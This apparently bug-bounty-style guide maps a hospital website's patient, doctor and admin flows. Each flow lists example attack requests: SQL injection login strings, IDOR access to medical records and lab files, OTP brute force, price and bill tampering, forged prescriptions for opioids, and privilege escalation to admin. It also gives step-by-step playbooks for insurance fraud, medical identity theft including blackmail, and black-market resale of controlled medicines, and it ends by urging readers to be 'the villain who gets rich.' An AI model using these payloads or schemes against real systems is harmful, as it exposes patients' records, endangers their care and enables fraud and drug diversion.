# 🏥 **HOSPITAL WEBSITE FLOW ANALYSIS & ATTACK MAP**

## **1. UNDERSTAND THE HOSPITAL SYSTEM**

### **Stakeholders & Their Goals:**
- **Patients:** Book appointments, view reports, pay bills, consult doctors
- **Doctors:** View schedules, access patient records, prescribe medication
- **Administrators:** Manage users, view analytics, handle billing
- **Labs/Pharmacy:** Receive orders, update status, manage inventory

### **Critical Assets (What's Valuable):**
```
💰 Money: Bill payments, insurance claims, pharmacy payments
📊 Data: Patient medical records, prescriptions, lab reports
🔐 Control: Doctor accounts, admin panels, appointment systems
```

---

## **2. PATIENT FLOW MAPPING & ATTACK POINTS**

### **FLOW 1: Patient Registration & Login**
```
Step 1: Visit hospital website → Click "Register"
Step 2: Fill form (Name, Email, Phone, DOB, Medical History)
Step 3: Verify email/phone via OTP
Step 4: Set password → Login
Step 5: Redirect to patient dashboard
```

**🔴 ATTACK POINTS:**
```http
# 1. Registration Bypass
POST /register
{
  "email": "victim@gmail.com",
  "phone": "9999999999",
  "otp": "000000"  # Try default/weak OTP
}

# 2. Email/Phone Enumeration
POST /check-email
{"email": "admin@hospital.com"} → Different response?

# 3. Weak OTP Logic
- Reuse OTP from previous session
- Brute force 6-digit OTP (if no rate limit)
- OTP sent in response body

# 4. Password Reset Hijacking
POST /reset-password
{
  "email": "victim@gmail.com",
  "new_password": "hacker123",
  "token": "predictable_token"
}
```

### **FLOW 2: Book Appointment**
```
Step 1: Select department/specialization
Step 2: Choose doctor → View available slots
Step 3: Select date/time → Fill symptoms
Step 4: Choose payment mode (Pay now/At hospital)
Step 5: Confirm → Get appointment ID
```

**🔴 ATTACK POINTS:**
```http
# 1. Doctor Schedule Manipulation
POST /book-appointment
{
  "doctor_id": "101",
  "date": "2024-12-25",
  "time_slot": "10:00",
  "patient_id": "current_user_id"  # Change to other patient ID
}

# 2. Overbooking/Denial of Service
- Book all slots for a doctor
- Cancel and immediately rebook
- Book fake appointments

# 3. Price Tampering (if paid online)
POST /confirm-appointment
{
  "appointment_id": "123",
  "consultation_fee": "0",  # Change from 500 to 0
  "payment_status": "paid"
}

# 4. Appointment Details Leakage
GET /appointment/12345
# Change appointment ID to access others' appointments
```

### **FLOW 3: Access Medical Records**
```
Step 1: Navigate to "Medical Records"
Step 2: View list of past consultations
Step 3: Click on specific record
Step 4: View doctor notes, prescriptions, lab reports
Step 5: Download/Share records
```

**🔴 ATTACK POINTS:**
```http
# 1. IDOR - Access Others' Records
GET /api/medical-records?patient_id=1001
# Change patient_id to 1002, 1003, etc.

# 2. Direct File Access
GET /uploads/reports/patient_1001_lab.pdf
# Try patient_1002_lab.pdf, patient_1003_lab.pdf

# 3. Search Parameter Manipulation
GET /records/search?query=HIV
# Try: query=*, query=all, query=' OR 1=1 --

# 4. Export Functionality Abuse
POST /export-records
{
  "format": "csv",
  "patient_ids": ["1001", "1002", "1003"]  # Add more IDs
}
```

### **FLOW 4: Lab Test Results**
```
Step 1: Doctor prescribes tests
Step 2: Patient pays for tests
Step 3: Sample collected
Step 4: Lab uploads results
Step 5: Patient views results
```

**🔴 ATTACK POINTS:**
```http
# 1. Lab Result Upload Manipulation
POST /lab/upload-result
{
  "test_id": "LAB5001",
  "result_url": "https://malicious.com/fake_report.pdf",
  "status": "normal"  # Change critical results to normal
}

# 2. Early Result Access
GET /lab/results?test_id=LAB5001
# Access before official release

# 3. Result Deletion/Modification
DELETE /lab/results/LAB5001
POST /lab/update-result
{
  "test_id": "LAB5001", 
  "new_result": "All tests normal"
}
```

### **FLOW 5: Pharmacy & Prescriptions**
```
Step 1: Doctor writes prescription
Step 2: Prescription appears in patient account
Step 3: Patient orders medicines online
Step 4: Pay → Medicine delivered
```

**🔴 ATTACK POINTS:**
```http
# 1. Prescription Forgery
POST /pharmacy/new-prescription
{
  "patient_id": "1001",
  "doctor_id": "101",  # Use real doctor's ID
  "medicines": ["Morphine", "Oxycodone"],
  "signature": "stolen_digital_signature"
}

# 2. Medicine Price Manipulation
POST /cart/checkout
{
  "items": [
    {"medicine_id": "MED123", "price": "0.01"}  # Original: $50
  ],
  "total": "0.01"
}

# 3. Unlimited Quantity Order
POST /cart/add
{
  "medicine_id": "CONTROLLED_MED123",
  "quantity": "9999"  # Controlled substance
}
```

### **FLOW 6: Billing & Insurance**
```
Step 1: Hospital generates bill
Step 2: Patient views bill online
Step 3: Apply insurance claim
Step 4: Pay remaining amount
Step 5: Download receipt
```

**🔴 ATTACK POINTS:**
```http
# 1. Bill Amount Manipulation
POST /billing/update
{
  "bill_id": "BILL2024001",
  "total_amount": "100",  # Change from $5000 to $100
  "insurance_covered": "4900"
}

# 2. Insurance Fraud
POST /insurance/claim
{
  "bill_id": "BILL2024001",
  "patient_id": "1001",
  "insurance_id": "fake_policy_number",
  "amount": "5000"
}

# 3. Receipt Forgery
GET /receipt/generate?bill_id=BILL2024001&format=pdf
# Modify bill details in request
```

---

## **3. DOCTOR FLOW (HIGH VALUE TARGET)**

### **Doctor Dashboard Access:**
```
Step 1: Doctor login (special credentials)
Step 2: View appointment schedule
Step 3: Access patient records
Step 4: Write prescriptions
Step 5: Update medical notes
```

**🔴 ATTACK POINTS:**
```http
# 1. Doctor Account Takeover
POST /doctor/login
{
  "username": "dr.smith",
  "password": "' OR '1'='1"  # SQL Injection
}

# 2. Elevate from Patient to Doctor
POST /api/update-profile
{
  "user_type": "doctor",
  "specialization": "cardiology",
  "license_number": "stolen_license"
}

# 3. Access All Patient Data
GET /doctor/patients?filter=all
# Bypass filters to get complete database

# 4. Prescription Authority Abuse
POST /prescribe
{
  "patient_id": "ANY_PATIENT",
  "medicine": "CONTROLLED_SUBSTANCE",
  "dosage": "dangerous_amount",
  "refills": "999"
}
```

---

## **4. ADMIN FLOW (ULTIMATE TARGET)**

### **Admin Panel Access:**
```
Step 1: Admin login (/admin)
Step 2: Manage users (patients, doctors, staff)
Step 3: View financial reports
Step 4: System configuration
Step 5: Database backups
```

**🔴 ATTACK POINTS:**
```http
# 1. Direct Admin Access
/admin
/admin.php
/administrator
/panel
/backend

# 2. Parameter Tampering to Gain Admin
POST /login
{
  "email": "patient@gmail.com",
  "password": "patient123",
  "is_admin": "true"
}

# 3. User Management Abuse
POST /admin/create-user
{
  "email": "hacker@evil.com",
  "role": "superadmin",
  "permissions": "all"
}

# 4. Financial Data Access
GET /admin/reports/financial?year=2024
# Download all billing data

# 5. Database Dump
GET /admin/backup?type=sql
GET /admin/export?table=patients
```

---

## **5. BUSINESS LOGIC ATTACKS (HOSPITAL SPECIFIC)**

### **Attack 1: Appointment Scalping**
```python
# Bot to book all premium doctor slots
while True:
    book_appointment(premium_doctor, prime_time)
    # Resell appointments offline
```

### **Attack 2: Insurance Claim Fraud**
```
1. Create fake patient accounts
2. Generate fake medical bills
3. Submit insurance claims
4. Collect payout
```

### **Attack 3: Medical Identity Theft**
```
1. Steal patient credentials
2. Access medical history
3. Use for:
   - Fake insurance claims
   - Purchase controlled medicines
   - Blackmail with sensitive conditions
```

### **Attack 4: Medicine Reselling**
```
1. Order prescription medicines at low cost
2. Change delivery address to drop location
3. Resell on black market at high profit
```

---


**Remember:** Every flow is a story. Your job is to find plot holes in that story where you can insert yourself as the villain who gets rich. 

Start with one flow, master it, then move to the next. Depth over breadth. One critical find in payment flow is worth 100 low-severity issues.

**Happy flow breaking! 🚀**
